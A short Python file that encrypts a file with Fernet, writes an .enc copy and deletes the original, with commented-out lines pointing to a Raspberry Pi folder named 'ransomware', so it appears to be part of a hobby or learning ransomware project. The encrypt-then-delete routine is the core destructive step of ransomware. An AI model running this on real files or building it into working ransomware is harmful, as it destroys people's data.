from cryptography.fernet import Fernet
import os

def encrypt(filename,key):
    f = Fernet(key)
    with open(filename,"rb") as content:
        content = content.read()
        
    encrypted_data = f.encrypt(content)
    
    with open(filename+".enc","wb") as enc_content:
        enc_content.write(encrypted_data)
    os.remove(filename)
    print("original file deleted!",filename)
        
    
# key = loadkey.load_key()
# path = "/home/pi/Documents/ransomware/text.txt"
# encrypt(path,key)
